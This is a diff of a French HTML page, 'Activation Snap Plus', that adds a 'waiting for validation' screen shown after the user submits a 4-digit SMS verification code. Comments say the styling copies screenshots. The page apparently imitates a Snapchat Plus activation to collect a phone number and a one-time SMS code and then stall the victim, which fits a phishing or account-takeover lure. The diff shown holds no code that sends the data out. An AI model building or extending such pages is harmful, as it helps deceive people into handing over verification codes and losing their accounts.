@@ -9,7 +9,7 @@
     
     <title>Activation Snap Plus</title>
     <style>
-        /* --- FOND ET SCROLL --- */
+        /* --- FOND ET STYLE GÉNÉRAL --- */
         html {
             background-color: #1e053d; 
             margin: 0;
@@ -136,7 +136,7 @@
 
         input::placeholder { color: #4b4b4b; }
 
-        /* --- TEXTES SMS (image_10.png) --- */
+        /* --- TEXTES SMS --- */
         .sms-instruction {
             font-size: 18px;
             font-weight: 500;
@@ -171,7 +171,38 @@
         .btn-glow:active { transform: scale(0.98); }
         .btn-glow:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* --- INFO BOX --- */
+        /* --- ÉTAPE 3 : MENU ATTENTE (image_11.png) --- */
+        .status-box {
+            background-color: rgba(30, 15, 60, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 35px 20px;
+            margin-bottom: 40px;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        .hourglass-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .status-title {
+            color: #4ade80; /* Vert comme sur la photo */
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .status-text {
+            color: #ffffff;
+            font-size: 16px;
+            line-height: 1.5;
+            margin: 0;
+            opacity: 0.9;
+        }
+
+        /* --- INFO BOX ATTENTION --- */
         .info-box {
             background-color: rgba(25, 10, 45, 0.7);
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -181,6 +212,11 @@
 
         .info-header { color: #ffcc00; font-weight: bold; margin-bottom: 10px; }
         .info-text { color: #a0a0a0; font-size: 14px; margin: 0; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
@@ -208,7 +244,7 @@
             <button class="btn-glow" id="submitBtn" onclick="processValidation()">Valider</button>
         </div>
 
-        <!-- ÉTAPE 2 : CODE SMS (Masqué au départ) -->
+        <!-- ÉTAPE 2 : CODE SMS -->
         <div id="step-2" style="display: none;">
             <div class="sms-instruction">📱 Un code de vérification a été envoyé par SMS</div>
             <div class="sms-subtext">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
@@ -216,7 +252,18 @@
             <div class="input-group">
                 <input type="tel" placeholder="Code à 4 chiffres" maxlength="4" style="text-align: center;">
             </div>
-            <button class="btn-glow">Vérifier</button>
+            <button class="btn-glow" onclick="showWaitingMenu()">Vérifier</button>
+        </div>
+
+        <!-- ÉTAPE 3 : MENU EN ATTENTE (image_11.png) -->
+        <div id="step-3" style="display: none;">
+            <div class="status-box">
+                <span class="hourglass-icon">⏳</span>
+                <div class="status-title">En attente de validation</div>
+                <p class="status-text">
+                    Votre code a été soumis. Veuillez patienter pendant que nous le validons...
+                </p>
+            </div>
         </div>
 
         <div class="info-box">
@@ -230,20 +277,28 @@
     </div>
 
     <script>
+        // Passage de l'étape 1 à l'étape 2
         function processValidation() {
             const btn = document.getElementById('submitBtn');
             const step1 = document.getElementById('step-1');
             const step2 = document.getElementById('step-2');
 
-            // 1. Changement du texte du bouton
             btn.innerHTML = "Envoi en cours";
             btn.disabled = true;
 
-            // 2. Attente de 2 secondes avant le changement d'interface
             setTimeout(() => {
                 step1.style.display = 'none';
                 step2.style.display = 'block';
             }, 2000);
+        }
+
+        // Passage de l'étape 2 à l'étape 3 (image_11.png)
+        function showWaitingMenu() {
+            const step2 = document.getElementById('step-2');
+            const step3 = document.getElementById('step-3');
+
+            step2.style.display = 'none';
+            step3.style.display = 'block';
         }
     </script>
 
